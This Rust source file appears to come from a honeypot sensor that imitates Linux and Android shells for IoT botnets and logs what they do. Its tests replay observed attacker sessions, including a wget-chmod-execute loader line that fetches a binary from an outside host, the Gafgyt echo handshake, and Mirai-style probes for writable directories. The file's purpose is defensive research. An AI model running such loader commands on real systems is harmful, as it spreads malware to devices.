/// `mount` with no arguments (or `-l`): util-linux's `source on point type fstype (opts)` lines
/// from the fake filesystem's one mount table. Any other form is a root mounting something,
/// which prints nothing on success.
fn cmd_mount(parts: &[&str]) -> String {
    let listing = parts[1..].iter().all(|a| *a == "-l" || *a == "-v");
    if !listing {
        return String::new();
    }
    let mut out = String::new();
    for m in crate::fakefs::MOUNT_TABLE {
        out.push_str(&format!(
            "{} on {} type {} ({})\n",
            m.source, m.point, m.fstype, m.opts
        ));
    }
    out
}

/// `uname` with real per-flag field selection. Each flag adds its field and the selected fields
/// print in coreutils' fixed order (kernel-name, nodename, kernel-release, kernel-version, machine,
/// processor, hardware-platform, operating-system); a bare `uname` prints the kernel name only, and
/// `-a` the full canonical line. The previous shortcut - ANY flag returned the whole `uname -a`
/// line - was a one-probe fingerprint (real `uname -m` prints only `x86_64`) that also fed IoT
/// loaders a garbage machine string and broke their architecture-based payload selection. Fields
/// come from persona so `uname` cannot disagree with /etc/os-release or the prompt.
fn cmd_uname(parts: &[&str], flavor: ShellFlavor) -> String {
    let android = flavor == ShellFlavor::AndroidSh;
    let host = if android {
        persona::ANDROID_HOSTNAME.to_string()
    } else {
        persona::hostname()
    };
    let (kernel_release, kernel_build, arch) = if android {
        (
            persona::ANDROID_KERNEL_RELEASE,
            persona::ANDROID_KERNEL_BUILD,
            persona::ANDROID_ARCH,
        )
    } else {
        (
            persona::KERNEL_RELEASE,
            persona::KERNEL_BUILD,
            persona::ARCH,
        )
    };
    let (
        mut want_s,
        mut want_n,
        mut want_r,
        mut want_v,
        mut want_m,
        mut want_p,
        mut want_i,
        mut want_o,
    ) = (false, false, false, false, false, false, false, false);
    let mut all = false;
    let mut any_flag = false;
    for arg in &parts[1..] {
        if let Some(long) = arg.strip_prefix("--") {
            any_flag = true;
            match long {
                "all" => all = true,
                "kernel-name" => want_s = true,
                "nodename" => want_n = true,
                "kernel-release" => want_r = true,
                "kernel-version" => want_v = true,
                "machine" => want_m = true,
                "processor" => want_p = true,
                "hardware-platform" => want_i = true,
                "operating-system" => want_o = true,
                _ => {}
            }
        } else if let Some(shorts) = arg.strip_prefix('-') {
            any_flag = true;
            for c in shorts.chars() {
                match c {
                    'a' => all = true,
                    's' => want_s = true,
                    'n' => want_n = true,
                    'r' => want_r = true,
                    'v' => want_v = true,
                    'm' => want_m = true,
                    'p' => want_p = true,
                    'i' => want_i = true,
                    'o' => want_o = true,
                    _ => {}
                }
            }
        }
    }
    // `-a` reuses the canonical line (same persona source), keeping its exact historical bytes; a
    // bare `uname` is the kernel name, like real coreutils.
    if all {
        return if android {
            format!("{}\n", crate::persona::android_uname_all())
        } else {
            format!("{}\n", persona::uname_all(&host))
        };
    }
    if !any_flag {
        return "Linux\n".to_string();
    }
    let mut fields = Vec::new();
    if want_s {
        fields.push("Linux".to_string());
    }
    if want_n {
        fields.push(host.clone());
    }
    if want_r {
        fields.push(kernel_release.to_string());
    }
    if want_v {
        fields.push(kernel_build.to_string());
    }
    if want_m {
        fields.push(arch.to_string());
    }
    if want_p {
        fields.push(arch.to_string());
    }
    if want_i {
        fields.push(arch.to_string());
    }
    if want_o {
        // Android's userspace is not GNU; `uname -o` there says Android.
        fields.push(if android { "Android" } else { "GNU/Linux" }.to_string());
    }
    if fields.is_empty() {
        // Only unrecognized flags: degrade to the kernel name rather than erroring, since a wrong
        // error format would itself be a tell.
        return "Linux\n".to_string();
    }
    format!("{}\n", fields.join(" "))
}

/// A plausible fetched body, printed by `curl URL` and `wget -O- URL` (the `... | sh` pattern).
/// Canned by necessity - the module performs zero network I/O - but real servers do answer a bare
/// path with exactly this Apache-default page, so it is not itself a tell; the previous tell was
/// only that `-O`/`-o` (save to a file) also printed it, which a real client never does.
const FETCHED_BODY: &str =
    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n";

/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final "saved"
/// summary) - zero network I/O, see the module doc. The timestamp is `now`, the session clock's
/// time (a frozen date is a tell an attacker catches by running twice). The saved filename is derived from `-O` or
/// the URL's own basename rather than a constant "index.html" (every download claiming the same
/// name was a tell); `-q`/`-nv` suppress the banner as real wget does; `-O-`/`-qO-` write the body
/// to stdout (the `wget -qO- | sh` loader pattern) instead of the transcript.
fn cmd_wget(parts: &[&str], now: chrono::DateTime<chrono::Utc>) -> String {
    let url = fetch_url_arg("wget", &parts[1..]).unwrap_or("");
    let sanitized_url = sanitize_value(url, MAX_URL_LEN);

    let out = wget_output(parts);
    if out == WgetOutput::Stdout {
        return FETCHED_BODY.to_string();
    }
    if parts
        .iter()
        .any(|&p| p == "-q" || p == "-nv" || p == "--quiet")
    {
        return String::new();
    }
    let name = match out {
        WgetOutput::File(n) => n,
        _ => wget_basename(url),
    };
    let name = sanitize_value(&name, MAX_URL_LEN);
    let now = now.format("%Y-%m-%d %H:%M:%S");
    format!(
        "--{now}--  {sanitized_url}\n\
         Connecting to {sanitized_url}... connected.\n\
         HTTP request sent, awaiting response... 200 OK\n\
         Length: 1234 (1.2K) [application/octet-stream]\n\
         Saving to: '{name}'\n\
         \n\
         {name}          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
         \n\
         {now} (1.2 MB/s) - '{name}' saved [1234/1234]\n"
    )
}

#[derive(PartialEq)]
enum WgetOutput {
    Stdout,
    File(String),
    Default,
}

/// Resolve wget's output target from its flags: `-O-`/`-qO-` -> stdout, `-O <name>` -> that file,
/// otherwise the default (URL basename).
fn wget_output(parts: &[&str]) -> WgetOutput {
    for (i, &p) in parts.iter().enumerate() {
        if p == "-O-" || p == "-qO-" || p == "-nvO-" {
            return WgetOutput::Stdout;
        }
        if p == "-O" {
            match parts.get(i + 1) {
                Some(&"-") => return WgetOutput::Stdout,
                Some(name) => return WgetOutput::File(strip_one_quote_pair(name).to_string()),
                None => return WgetOutput::Default,
            }
        }
        if let Some(name) = p.strip_prefix("-O") {
            // `-Ofile` (no space).
            if name == "-" {
                return WgetOutput::Stdout;
            }
            return WgetOutput::File(name.to_string());
        }
    }
    WgetOutput::Default
}

/// The basename a real wget would save a URL to: the last path segment (query string stripped), or
/// `index.html` when the URL ends in `/` or has no path.
/// The local file a fetch command writes its body to, or `None` when it writes to stdout (and so
/// leaves nothing behind). `parts[0]` is the command token; `cmd` is its basename, already
/// resolved by the caller so a full-path or BusyBox form lands here the same way.
fn download_save_name(cmd: &str, parts: &[&str]) -> Option<String> {
    let args = &parts[1..];
    match cmd {
        "wget" => match wget_output(parts) {
            WgetOutput::Stdout => None,
            WgetOutput::File(name) => Some(name),
            WgetOutput::Default => Some(wget_basename(fetch_url_arg("wget", args)?)),
        },
        "curl" => {
            let mut it = args.iter();
            while let Some(&a) = it.next() {
                if a == "-O" || a == "--remote-name" {
                    return Some(wget_basename(fetch_url_arg("curl", args)?));
                }
                if a == "-o" || a == "--output" {
                    return it.next().map(|n| strip_one_quote_pair(n).to_string());
                }
                if let Some(name) = a.strip_prefix("-o")
                    && !name.is_empty()
                {
                    return Some(name.to_string());
                }
            }
            None
        }
        // BusyBox `tftp -g -r REMOTE [-l LOCAL] HOST`: the local name wins when given.
        "tftp" => {
            let (mut remote, mut local) = (None, None);
            let mut it = args.iter();
            while let Some(&a) = it.next() {
                match a {
                    "-r" => remote = it.next().copied(),
                    "-l" => local = it.next().copied(),
                    _ => {}
                }
            }
            local.or(remote).map(str::to_string)
        }
        // BusyBox `ftpget [opts] HOST [LOCAL] REMOTE`: the local name is the second positional
        // when three are given, else the remote name doubles as it.
        "ftpget" => {
            let mut positional = Vec::new();
            let mut it = args.iter();
            while let Some(&a) = it.next() {
                match a {
                    "-u" | "-p" | "-P" => {
                        it.next();
                    }
                    _ if a.starts_with('-') => {}
                    _ => positional.push(a),
                }
            }
            match positional.len() {
                0 | 1 => None,
                2 => Some(positional[1].to_string()),
                _ => Some(positional[1].to_string()),
            }
        }
        _ => None,
    }
}

fn wget_basename(url: &str) -> String {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    match path.trim_end_matches('/').rsplit('/').next() {
        Some(seg) if !seg.is_empty() && !seg.contains(':') => seg.to_string(),
        _ => "index.html".to_string(),
    }
}

/// `curl URL`. With `-O`/`-o` (save to a file) a real curl writes nothing to stdout - only a
/// progress meter to stderr, which this shell does not emit - so the output is empty; the previous
/// implementation printed the fetched body even under `-O`, which no real curl does and which was a
/// clean one-probe tell. Without `-o`/`-O`, the body goes to stdout as curl does.
fn cmd_curl(parts: &[&str]) -> String {
    let saves_to_file = parts.iter().enumerate().any(|(i, &p)| {
        p == "-O"
            || p == "--remote-name"
            || p == "-o"
            || p == "--output"
            || (p.starts_with("-o") && p.len() > 2)
            // a combined short-flag cluster containing O or o, e.g. -sO, -fsSLO
            || (p.starts_with('-') && !p.starts_with("--") && p[1..].chars().any(|c| c == 'O')
                && parts.get(i).is_some())
    });
    if saves_to_file {
        String::new()
    } else {
        FETCHED_BODY.to_string()
    }
}

/// `ping HOST`. Real ping exists on virtually every host, so "command not found" is a tell. A
/// line-based fake shell cannot stream a continuous ping, so this answers as though `-c` bounded it:
/// a couple of replies and a summary against the requested target, printed at once.
fn cmd_ping(parts: &[&str]) -> String {
    let target = first_non_flag_arg(&parts[1..]).unwrap_or("localhost");
    let target = sanitize_value(target, MAX_URL_LEN);
    // A stable pseudo-address for the target so two pings of the same host agree (a real resolve
    // would); derived from the name, not random.
    let last = 1 + (target.bytes().fold(0u32, |a, b| a.wrapping_add(b as u32)) % 253);
    format!(
        "PING {target} ({}): 56 data bytes\n\
         64 bytes from {}: icmp_seq=0 ttl=54 time=11.4 ms\n\
         64 bytes from {}: icmp_seq=1 ttl=54 time=11.9 ms\n\
         \n\
         --- {target} ping statistics ---\n\
         2 packets transmitted, 2 packets received, 0.0% packet loss\n\
         round-trip min/avg/max/stddev = 11.4/11.7/11.9/0.3 ms\n",
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
    )
}

/// The first token that does not look like a flag (does not start with `-`), or `None` if every
/// token is a flag or the slice is empty. `ls -la`, `ls -la /tmp`, and `cat -A file` all name
/// their real target after zero or more flags this fake shell has no reason to parse
/// individually; treating the first `-`-prefixed token as the path (what a bare
/// `parts.get(1)` lookup would do) misreads the single most common attacker recon command
/// (`ls -la`) as a lookup for a nonexistent path named `-la`.
fn first_non_flag_arg<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|arg| !arg.starts_with('-')).copied()
}

/// A script whose every line is empty or a comment (first non-blank char `#`). Such a file makes
/// `sh FILE` exit 0 silently; the `.fxcat` sweep's one-byte "\n" files are the case that matters.
fn is_blank_or_comment_only(content: &str) -> bool {
    content.lines().all(|l| {
        let t = l.trim_start();
        t.is_empty() || t.starts_with('#')
    })
}

/// A honeypot `echo` faithful enough to survive the shell-detection handshakes IoT botnets run
/// before they drop a payload. The important one is Gafgyt/BASHLITE, which sends
/// `echo -e "\x47\x41\x59\x46\x47\x54"` and hangs up unless it reads back exactly `GAYFGT`. The
/// previous implementation joined the raw tokens (flags, surrounding quotes, and undecoded escapes
/// included), so that probe returned `-e "\x47\x41\x59\x46\x47\x54"` and fingerprinted the honeypot
/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags, removes one pair of matching
/// surrounding quotes per token (the whitespace tokenizer keeps them), and under `-e` decodes the
/// backslash escapes a real `echo -e` would. It only transforms text - nothing here is evaluated or
/// executed, per the module's never-exec guarantee.
fn cmd_echo(args: &[&str]) -> String {
    let mut interpret = false; // -e
    let mut trailing_newline = true; // -n suppresses
    let mut first_operand = 0;
    for (idx, tok) in args.iter().enumerate() {
        // A flag token is '-' followed only by e/n/E (e.g. -e, -n, -E, -en). Anything else, or a
        // bare '-', ends the option run and begins the operands.
        let is_flag = tok.len() >= 2
            && tok.starts_with('-')
            && tok[1..].chars().all(|c| matches!(c, 'e' | 'n' | 'E'));
        if !is_flag {
            first_operand = idx;
            break;
        }
        for c in tok[1..].chars() {
            match c {
                'e' => interpret = true,
                'E' => interpret = false,
                'n' => trailing_newline = false,
                _ => {}
            }
        }
        first_operand = idx + 1;
    }

    let mut out = String::new();
    for (idx, tok) in args[first_operand..].iter().enumerate() {
        if idx > 0 {
            out.push(' ');
        }
        let unquoted = strip_one_quote_pair(tok);
        if interpret {
            if decode_echo_escapes_into(unquoted, &mut out) {
                // A `\c` escape stops all further output, including the trailing newline.
                return out;
            }
        } else {
            out.push_str(unquoted);
        }
    }
    if trailing_newline {
        out.push('\n');
    }
    out
}

/// Remove one pair of matching surrounding quotes (`"..."` or `'...'`) from a token, if present.
/// The fake shell tokenizes on whitespace, so a quoted argument with no internal spaces arrives as
/// a single token still wearing its quotes; a real shell would have stripped them before `echo`.
fn strip_one_quote_pair(tok: &str) -> &str {
    let bytes = tok.as_bytes();
    if bytes.len() >= 2
        && (bytes[0] == b'"' || bytes[0] == b'\'')
        && bytes[bytes.len() - 1] == bytes[0]
    {
        &tok[1..tok.len() - 1]
    } else {
        tok
    }
}

/// Decode the backslash escapes `echo -e` understands, appending to `out`. Returns `true` if a
/// `\c` escape was hit, which tells the caller to stop producing output entirely. Supports the
/// escapes real-world loaders actually use: `\xHH` hex, `\0NNN`/`\NNN` octal, and the single-letter
/// set (`\n \t \r \\ \a \b \f \v \0`).
fn decode_echo_escapes_into(s: &str, out: &mut String) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('a') => out.push('\x07'),
            Some('b') => out.push('\x08'),
            Some('f') => out.push('\x0c'),
            Some('v') => out.push('\x0b'),
            Some('\\') => out.push('\\'),
            Some('c') => return true, // stop all further output
            Some('x') => {
                // Up to two hex digits.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 2 {
                    match chars.peek().and_then(|d| d.to_digit(16)) {
                        Some(d) => {
                            val = val * 16 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if n == 0 {
                    out.push_str("\\x"); // not a valid escape: emit literally
                } else if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some('0') => {
                // \0NNN: up to three octal digits after the 0.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 3 {
                    match chars.peek().and_then(|d| d.to_digit(8)) {
                        Some(d) => {
                            val = val * 8 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some(other) => {
                // Unknown escape: bash echo -e emits it verbatim (backslash included).
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'), // trailing backslash
        }
    }
    false
}

#[cfg(test)]
mod echo_tests {
    use super::cmd_echo;

    #[test]
    fn gafgyt_handshake_returns_gayfgt() {
        // The exact probe Gafgyt/BASHLITE sends, tokenized as the fake shell would split it:
        // `echo` `-e` `"\x47\x41\x59\x46\x47\x54"`. It must read back "GAYFGT" or the bot hangs up.
        let out = cmd_echo(&["-e", "\"\\x47\\x41\\x59\\x46\\x47\\x54\""]);
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn plain_echo_strips_surrounding_quotes() {
        assert_eq!(cmd_echo(&["\"hello\""]), "hello\n");
        assert_eq!(cmd_echo(&["'world'"]), "world\n");
    }

    #[test]
    fn without_dash_e_escapes_stay_literal() {
        // Default (no -e) and explicit -E both leave backslash escapes untouched.
        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
        assert_eq!(cmd_echo(&["-E", "\"\\x47\""]), "\\x47\n");
    }

    #[test]
    fn dash_n_suppresses_the_trailing_newline() {
        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
        assert_eq!(cmd_echo(&["-en", "\"\\x41\""]), "A");
    }

    #[test]
    fn decodes_hex_and_octal_escapes_under_dash_e() {
        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
    }

    #[test]
    fn dash_c_stops_output_including_newline() {
        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
    }

    #[test]
    fn multiple_operands_join_with_single_spaces() {
        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
    }

    #[test]
    fn bare_echo_prints_only_a_newline() {
        assert_eq!(cmd_echo(&[]), "\n");
    }
}

#[cfg(test)]
mod shell_detection_tests {
    use super::{
        BUSYBOX_APPLETS, EmitContext, FakeShell, OutputFd, SIGNAL_HONEYPOT_FILE_DOWNLOAD,
        busybox_banner, cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, onlcr,
        simple_commands, url_if_fetch_line,
    };
    use crate::fakefs::FakeFs;

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    fn exec_shell() -> FakeShell {
        FakeShell::exec(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "ssh".to_string(),
                session_id: None,
            },
        )
    }

    #[test]
    fn login_identity_controls_prompt_argv_zero_and_errors() {
        let mut sh = shell();
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");
        assert_eq!(
            sh.handle_input("nosuchcmd_q").0,
            "nosuchcmd_q: command not found\n"
        );
        assert_eq!(
            sh.handle_input("system").0,
            "Command 'system' not found, did you mean:\n  command 'system3' from deb simh (3.8.1-6.1)\n  command 'systemd' from deb systemd (249.11-0ubuntu3.21)\nTry: apt install <deb name>\n"
        );
        assert_eq!(
            sh.handle_input("ifconfig").0,
            "Command 'ifconfig' not found, but can be installed with:\napt install net-tools\n"
        );
        assert_eq!(
            sh.handle_input("cd /missing_q").0,
            "-bash: cd: /missing_q: No such file or directory\n"
        );
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(
            sh.prompt(),
            format!("root@{}:/tmp# ", crate::persona::hostname())
        );
    }

    #[test]
    fn exec_context_has_no_prompt_and_uses_bash_line_one_errors() {
        let mut sh = exec_shell();
        assert_eq!(sh.prompt(), "");
        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
        assert_eq!(
            sh.handle_input("nosuchcmd_q").0,
            "bash: line 1: nosuchcmd_q: command not found\n"
        );
        assert_eq!(
            sh.handle_input("cd /missing_q").0,
            "bash: line 1: cd: /missing_q: No such file or directory\n"
        );
    }

    #[test]
    fn nested_dash_levels_keep_independent_line_numbers() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("sh").0, "");
        assert_eq!(sh.prompt(), "# ");
        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
        assert_eq!(
            sh.handle_input("outer_missing").0,
            "sh: 2: outer_missing: not found\n"
        );

        assert_eq!(sh.handle_input("sh").0, "");
        assert_eq!(
            sh.handle_input("inner_missing").0,
            "sh: 1: inner_missing: not found\n"
        );
        let (inner_exit, _) = sh.handle_input("exit");
        assert_eq!(inner_exit, "");
        assert!(!inner_exit.close_session);
        assert_eq!(sh.prompt(), "# ");
        assert_eq!(
            sh.handle_input("outer_again").0,
            "sh: 4: outer_again: not found\n"
        );

        let (outer_exit, _) = sh.handle_input("exit");
        assert_eq!(outer_exit, "");
        assert!(!outer_exit.close_session);
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
    }

    #[test]
    fn nested_bash_logout_fails_and_exit_returns_to_login_shell() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("su").0, "");
        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
        let (logout, _) = sh.handle_input("logout");
        assert_eq!(logout.status, 1);
        assert_eq!(logout, "bash: logout: not login shell: use `exit'\n");

        let (nested_exit, _) = sh.handle_input("exit");
        assert_eq!(nested_exit, "exit\n");
        assert!(!nested_exit.close_session);
        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");

        let (login_exit, _) = sh.handle_input("exit; echo must_not_run");
        assert_eq!(login_exit, "logout\n");
        assert!(login_exit.close_session);
    }

    fn xor(s: &str, key: u8) -> String {
        String::from_utf8(crate::command_codec::xor_bytes(s, key)).unwrap()
    }

    /// A loader's writable-directory probe as seen in a live session: create an empty file, make
    /// it executable, run it, and only then move there. The run used to be "command not found",
    /// so the `cd` never happened; the trailing slash on the `cd` was refused too.
    #[test]
    fn writable_directory_probe_runs_the_created_file_and_changes_directory() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/");
        assert_eq!(out, "", "every step of the probe succeeds silently");
        assert_eq!(sh.handle_input("pwd").0, "/tmp\n");
        // Without the chmod the file is not runnable, and a path that does not exist is a
        // missing file, not a missing command.
        let mut fresh = shell();
        fresh.handle_input(">/tmp/e");
        assert_eq!(
            fresh.handle_input("/tmp/e").0,
            "-bash: /tmp/e: Permission denied\n"
        );
        assert_eq!(
            fresh.handle_input("/tmp/nothere").0,
            "-bash: /tmp/nothere: No such file or directory\n"
        );
        assert_eq!(
            fresh.handle_input("/tmp").0,
            "-bash: /tmp: Is a directory\n"
        );
        fresh.handle_input("chmod +x /tmp/e");
        assert_eq!(fresh.handle_input("/tmp/e").0, "");
        assert!(super::mode_grants_execute("755"));
        assert!(super::mode_grants_execute("0755"));
        assert!(!super::mode_grants_execute("644"));
        assert!(super::mode_grants_execute("a+x"));
        assert!(!super::mode_grants_execute("-x"));
    }

    /// The whole attacker session observed live on 2026-09-06, replayed in order through one
    /// shell: the Mirai telnet preamble, the two busybox probes, the writable-directory chains,
    /// and a loader stage. Every reply, the working directory and the emitted events are
    /// checked, so a line that regresses is caught here even when its own unit test still
    /// passes. Extend this when a new session line is observed; do not add a narrower test
    /// instead.
    #[test]
    fn observed_session_2026_09_06_replays_end_to_end() {
        let mut sh = shell();
        let mut command_events = 0usize;
        let mut download_urls: Vec<String> = Vec::new();
        let mut run = |sh: &mut FakeShell, line: &str| -> String {
            let (out, events) = sh.handle_input(line);
            for e in &events {
                match e.signal_type.as_str() {
                    sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC => command_events += 1,
                    sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD => download_urls
                        .push(e.metadata["url"].as_str().unwrap_or_default().to_string()),
                    _ => {}
                }
            }
            out.to_string()
        };

        // Preamble: bash lists its builtins for `enable`; `system`, `shell` and `linuxshell` do
        // not exist on bash; `sh` opens a nested shell silently.
        let out = run(&mut sh, "enable");
        assert!(
            out.contains("enable cd\n") && !out.contains("not found"),
            "{out}"
        );
        assert!(run(&mut sh, "system").starts_with("Command 'system' not found, did you mean:"));
        assert!(run(&mut sh, "shell").starts_with("Command 'shell' not found, did you mean:"));
        assert_eq!(
            run(&mut sh, "linuxshell"),
            "linuxshell: command not found\n"
        );
        assert_eq!(run(&mut sh, "sh"), "");

        // Probes on one line: the listing then the applet reply, in order.
        assert_eq!(
            run(&mut sh, "ls /home; /bin/busybox BOTNET"),
            "ubuntu\nBOTNET: applet not found\n"
        );
        let out = run(&mut sh, "cat /proc/mounts; /bin/busybox URUMV");
        assert!(out.contains("/dev/sda1 / ext4 "), "{out}");
        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");

        // Writable-directory chains: the marker prints and the shell is left where the chain
        // ended.
        let out = run(
            &mut sh,
            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
        );
        assert_eq!(out, "QJLXTK\n");
        assert_eq!(run(&mut sh, "pwd"), "/var\n");
        assert_eq!(
            run(&mut sh, ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"),
            ""
        );
        assert_eq!(run(&mut sh, "pwd"), "/tmp\n");

        // Loader stage: fetch to a file, make it executable, run it, delete it. Each step
        // depends on what the one before left behind, so the replies are asserted exactly. A
        // check for the absence of "not found" passed while `./x86` answered "No such file or
        // directory", which is why the chain broke here unnoticed.
        let out = run(
            &mut sh,
            "/bin/busybox wget http://198.51.100.9/bins/x86 -O x86; chmod 777 x86; ./x86; rm -rf x86",
        );
        assert!(out.starts_with("--"), "wget prints its transcript: {out}");
        assert!(out.contains("Saving to: 'x86'"), "{out}");
        assert!(out.trim_end().ends_with("saved [1234/1234]"), "{out}");
        assert!(
            !out.contains("No such file") && !out.contains("Permission denied"),
            "every step found what the step before left: {out}"
        );
        assert_eq!(
            run(&mut sh, "ls /tmp"),
            "d\n",
            "the payload was removed and the probe file stays hidden"
        );
        assert_eq!(download_urls, vec!["http://198.51.100.9/bins/x86"]);
        assert_eq!(command_events, 13, "one command event per session line");
    }

    /// ADB is Android's own protocol, and the sensor announces a Nexus 5. The shell behind it
    /// answered as an Ubuntu bash on server01, which a bot confirms with one command. This is
    /// the same session an ADB dropper runs, answered as the device.
    #[test]
    fn the_adb_shell_answers_as_the_android_device_it_announces() {
        let mut sh = FakeShell::android(
            FakeFs::android(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: false,
                protocol_label: "adb".to_string(),
                session_id: None,
            },
        );
        // An `adb shell` session starts at /, not in a Linux server's /root.
        assert_eq!(sh.cwd(), "/");
        assert_eq!(sh.prompt(), crate::persona::android_root_prompt("/"));
        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
        assert_eq!(sh.handle_input("pwd").0, "/\n");
        assert_eq!(
            sh.handle_input("uname -a").0,
            format!("{}\n", crate::persona::android_uname_all())
        );
        assert_eq!(sh.handle_input("uname -m").0, "armv7l\n");
        assert_eq!(sh.handle_input("uname -o").0, "Android\n");
        assert!(
            !sh.handle_input("uname -a").0.contains("Ubuntu"),
            "the phone must not report the server's kernel"
        );
        // mksh, not bash: the message an unknown command gets is different, and bots read it.
        assert_eq!(sh.handle_input("foobarbaz").0, "sh: foobarbaz: not found\n");
        assert!(!sh.handle_input("foobarbaz").0.contains("bash"));
        // The device's own files answer, and the server's are absent.
        assert!(
            sh.handle_input("cat /system/build.prop")
                .0
                .contains(crate::persona::ANDROID_MODEL)
        );
        assert!(
            sh.handle_input("cat /default.prop")
                .0
                .contains("ro.secure=0")
        );
        assert_eq!(
            sh.handle_input("cat /etc/os-release").0,
            "cat: /etc/os-release: No such file or directory\n"
        );
        // The drop directories work and /system refuses writes, as on a real device.
        assert_eq!(sh.handle_input("cd /data/local/tmp").0, "");
        assert_eq!(sh.cwd(), "/data/local/tmp");
        assert_eq!(sh.handle_input(">payload && chmod 777 payload").0, "");
        assert_eq!(sh.handle_input("./payload").0, "");
        assert_eq!(
            sh.handle_input(">/system/bin/payload").0,
            "sh: /system/bin/payload: Read-only file system\n"
        );
        // Busybox is there because the device is rooted, so a loader chain still runs.
        assert_eq!(
            sh.handle_input("/system/bin/sh").0,
            "",
            "the device's own shell is present"
        );
        assert!(
            sh.handle_input("busybox ABCDEF")
                .0
                .contains("applet not found")
        );
        let (nested_exit, _) = sh.handle_input("exit");
        assert!(!nested_exit.close_session);
        let (outer_exit, _) = sh.handle_input("exit");
        assert!(outer_exit.close_session);
    }

    /// `cp`, `rm` and `mkdir` answered silent success while changing nothing, so a payload
    /// copied somewhere was not there afterwards and a file the shell said it deleted was still
    /// readable. Each now changes what the rest of the session sees, and reports the errors the
    /// real commands report.
    #[test]
    fn cp_rm_and_mkdir_change_the_filesystem_the_session_sees() {
        let mut sh = shell();
        sh.handle_input(">/tmp/payload");
        sh.handle_input("chmod +x /tmp/payload");

        // cp copies content and the executable bit; into a directory it keeps the name.
        assert_eq!(sh.handle_input("cp /tmp/payload /var/tmp/copy").0, "");
        assert_eq!(sh.handle_input("/var/tmp/copy").0, "", "the copy runs too");
        assert_eq!(sh.handle_input("cp /tmp/payload /mnt").0, "");
        assert_eq!(sh.handle_input("ls /mnt").0, "payload\n");
        assert_eq!(
            sh.handle_input("cp /tmp/absent /tmp/x").0,
            "cp: cannot stat '/tmp/absent': No such file or directory\n"
        );

        // mkdir creates a directory cd and ls accept; -p is quiet about one that exists.
        assert_eq!(sh.handle_input("mkdir /tmp/stage").0, "");
        assert_eq!(sh.handle_input("cd /tmp/stage").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/tmp/stage\n");
        assert_eq!(
            sh.handle_input("mkdir /tmp/stage").0,
            "mkdir: cannot create directory '/tmp/stage': File exists\n"
        );
        assert_eq!(sh.handle_input("mkdir -p /tmp/stage/a/b").0, "");
        assert_eq!(sh.handle_input("cd /tmp/stage/a/b").0, "");
        assert_eq!(
            sh.handle_input("mkdir /tmp/absent/deep").0,
            "mkdir: cannot create directory '/tmp/absent/deep': No such file or directory\n"
        );

        // rm removes for real, refuses a directory without -r, and -f is quiet about a miss.
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("rm payload").0, "");
        assert_eq!(
            sh.handle_input("cat /tmp/payload").0,
            "cat: /tmp/payload: No such file or directory\n"
        );
        assert_eq!(
            sh.handle_input("/tmp/payload").0,
            "-bash: /tmp/payload: No such file or directory\n",
            "a removed file stops being executable"
        );
        assert_eq!(
            sh.handle_input("rm /tmp/payload").0,
            "rm: cannot remove '/tmp/payload': No such file or directory\n"
        );
